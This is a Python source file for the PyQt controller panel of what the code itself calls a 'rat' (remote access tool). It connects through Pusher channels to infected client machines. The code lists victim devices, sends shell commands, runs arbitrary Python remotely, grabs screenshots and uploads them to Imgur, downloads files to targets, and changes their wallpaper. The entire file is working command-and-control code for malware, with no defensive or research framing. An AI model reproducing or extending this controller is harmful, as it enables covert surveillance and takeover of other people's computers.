# Imports
import sys

import requests
from PyQt5 import QtWidgets, QtCore, QtGui
from data.settings import Settings
import pusher
import pusher.errors
import pysher
import modules.exception as exception
from gui.blurer import GlobalBlur
sys.path.append('gui')
# Importing the main window
try:
    from gui import Ui_MainWindow
    from functions import *
except ImportError:
    from gui.gui import Ui_MainWindow
    from gui.functions import *

# Hooking exceptions
sys.excepthook = exception.hook

# Getting config
settings = Settings.get_settings()

# Global variables for annotations
client = pusher.Pusher
receiver = pysher.Pusher
channel: receiver.subscribe = None
client_id = str()

# Initializing the main window
app = QtWidgets.QApplication(sys.argv)
MainWindow = QtWidgets.QMainWindow()
ui = Ui_MainWindow()
ui.setupUi(MainWindow)
ui.pagesWidget.setCurrentIndex(0)

if 'acrylic' in Settings.get("theme"):
    GlobalBlur(MainWindow.winId(), acrylic=True)

# Trying to get settings or set default
try:
    fill_settings(ui)
except Exception as e:
    print(e)
    Settings.fix()

# Creating gui
MainWindow.show()


def initialize_pusher() -> None:
    """
    Registers the pusher client and receiver
    :return:
    """
    global client
    global receiver
    try:
        client = pusher.Pusher(
            app_id=settings["app_id"],
            key=settings["key"],
            secret=settings["secret"],
            cluster=settings["cluster"],
            ssl=False
        )
        receiver = pysher.Pusher(key=settings["key"], cluster=settings["cluster"])
        receiver.connection.bind('pusher:connection_established', handle_connection_to_server)
        receiver.connect()
    except Exception as e:
        print(e)


def open_menu(*args) -> None:
    """
    Animates the menu to open and close, using animation from config
    :return:
    """
    width = ui.leftMenu.geometry().width()
    Ui_MainWindow.animation = QtCore.QPropertyAnimation(ui.leftMenu, b"minimumWidth")
    Ui_MainWindow.animation.setDuration(Settings.animation()["timing"])
    if width == 60:
        Ui_MainWindow.animation.setStartValue(60)
        Ui_MainWindow.animation.setEndValue(200)
    else:
        Ui_MainWindow.animation.setStartValue(200)
        Ui_MainWindow.animation.setEndValue(60)
    Ui_MainWindow.animation.setEasingCurve(Settings.animation()["animation"])

    Ui_MainWindow.animation.start()


def handle_menu_click(text: str) -> None:
    """
    Handles the click on the menu and changes the page
    :param text:
    :return:
    """
    index = {
        "Menu": [open_menu, None],
        "Devices": [ui.pagesWidget.setCurrentIndex, 0],
        "Screenshot": [ui.pagesWidget.setCurrentIndex, 1],
        "Wallpaper": [ui.pagesWidget.setCurrentIndex, 2],
        "Console": [ui.pagesWidget.setCurrentIndex, 3],
        "Python": [ui.pagesWidget.setCurrentIndex, 4],
        "Download": [ui.pagesWidget.setCurrentIndex, 5],
        "Settings": [ui.pagesWidget.setCurrentIndex, 6]
    }
    index[text][0](index[text][1])


def handle_ping(data) -> None:
    """
    Handles the ping from the client
    :param data:
    :return:
    """
    if data == "pong":
        popup("Ping", "Connection to client is alive")


def on_logs(data):
    print(data)
    ui.logsPytoon.append(data)
    ui.logsConsole.append(data)
    ui.downloadLogs.append(data)
    ui.wallpaperLogs.append(data)


def clear_logs():
    ui.logsPytoon.clear()
    ui.logsConsole.clear()
    ui.downloadLogs.clear()
    ui.wallpaperLogs.clear()


def take_screenshot() -> None:
    """
    Takes and renders screenshot
    :return:
    """
    if client_id == str():
        popup("Error", "Connect to a client first")
        return
    client.trigger('admin-' + str(client_id), 'python', f"""
imgur_image = daun.screenshot.upload_to_imgur("{Settings.get_settings().get('client_id')}")
client.trigger('client-{client_id}', 'screenshot', imgur_image)
log("Received screenshot: " + imgur_image)
""")


def on_screenshot(data):
    image = QtGui.QImage()
    image.loadFromData(requests.get(data).content)
    ui.screenshotLabel.setPixmap(QtGui.QPixmap(image))


def we_controller(button):
    client.trigger('admin-' + str(client_id), 'python', f"""
daun.wallpaperengine.control_we("{button.text().lower()}")
log("Received we command: {button.text().lower()}")
""")


def connect_to_rat() -> None:
    """
    Connects to rat based on selected id
    :return:
    """
    global client_id
    try:
        client_id = ui.availableDevices.currentItem().text()
        client.trigger('admin-' + str(client_id), 'connection_from_admin', None)
        print("Sent connection message to client")
        channel = receiver.subscribe('client-' + client_id)
        channel.bind('ping', handle_ping)
        channel.bind('logs', on_logs)
        channel.bind('screenshot', on_screenshot)
    except Exception as e:
        print(e)


def handle_connection_to_server(connection) -> None:
    """
    On pusher connection
    :return:
    """
    print("Connected to server")
    print("Server returned: " + str(connection))
    try:
        ui.availableDevices.clear()
        for client_id_av in list(client.channels_info(prefix_filter='admin-')['channels']):
            ui.availableDevices.addItem(client_id_av.removeprefix('admin-'))
    except pusher.errors.PusherBadRequest:
        popup("Error", "Could not connect to pusher server\n"
                       "Do you have valid pusher config in settings tab?")


def reconnect_to_pusher() -> None:
    """
    Reconnects to pusher
    :return:
    """
    global receiver
    try:
        receiver.disconnect()
        print("Disconnected from pusher")
    except:
        print("Pusher not connected")
    initialize_pusher()


# Trying to connect to pusher
initialize_pusher()

# Connecting user interface to functions
ui.leftMenu.itemClicked.connect(lambda: handle_menu_click(ui.leftMenu.currentItem().text()))
ui.saveSettingsButton.clicked.connect(lambda: (globals().update(settings=update_settings(ui))))
ui.reconRefreshButton.clicked.connect(lambda: reconnect_to_pusher())
ui.connectButton.clicked.connect(lambda: connect_to_rat())
ui.availableDevices.itemDoubleClicked.connect(lambda: connect_to_rat())
ui.pingButton.clicked.connect(lambda: client.trigger('admin-' + client_id, 'ping', 'ping'))
ui.clearPythonLogs.clicked.connect(lambda: clear_logs())
ui.clearConsoleLogs.clicked.connect(lambda: clear_logs())
ui.clearDlLogsButton.clicked.connect(lambda: clear_logs())
ui.takeScreenshotButton.clicked.connect(lambda: take_screenshot())
ui.setWallpaperButton.clicked.connect(lambda: client.trigger('admin-' + str(client_id), 'python', f"""
daun.wallpaper.set_wallpaper("{ui.wallpaperUrlBox.text()}")
log("Wallpaper set to: {ui.wallpaperUrlBox.text()}")
"""))
ui.pauseWallpaperEngineButton.clicked.connect(lambda: we_controller(ui.pauseWallpaperEngineButton))
ui.playWallpaperEngineButton.clicked.connect(lambda: we_controller(ui.playWallpaperEngineButton))
ui.stopWallpaperEngineButton.clicked.connect(lambda: we_controller(ui.stopWallpaperEngineButton))
ui.muteWallpaperEngineButton.clicked.connect(lambda: we_controller(ui.muteWallpaperEngineButton))
ui.unmuteWallpaperEngineButton.clicked.connect(lambda: we_controller(ui.unmuteWallpaperEngineButton))
ui.wallpaperScreenshotButton.clicked.connect(lambda: client.trigger('admin-' + str(client_id), 'python', f"""
daun.wallpaper.set_wallpaper(daun.screenshot.save_screenshot())
log("Screenshot set as wallpaper")
"""))
ui.sendCommandButton.clicked.connect(lambda: client.trigger('admin-' + client_id, 'command',
                                                            ui.commandBox.text()))
ui.execPythonButton.clicked.connect(lambda: client.trigger('admin-' + client_id, 'python',
                                                           ui.pythonScriptEditor.toPlainText()))
ui.downloadButton.clicked.connect(lambda: client.trigger('admin-' + str(client_id), 'python', f"""
log("Downloading")
daun.download("{ui.downloadUrl.text()}", "{ui.pathToFileDownload.text()}")
log("Downloaded {ui.downloadUrl.text()} to {ui.pathToFileDownload.text()}")
"""))

# Handling closing of the window to exit whole program
sys.exit(app.exec_())
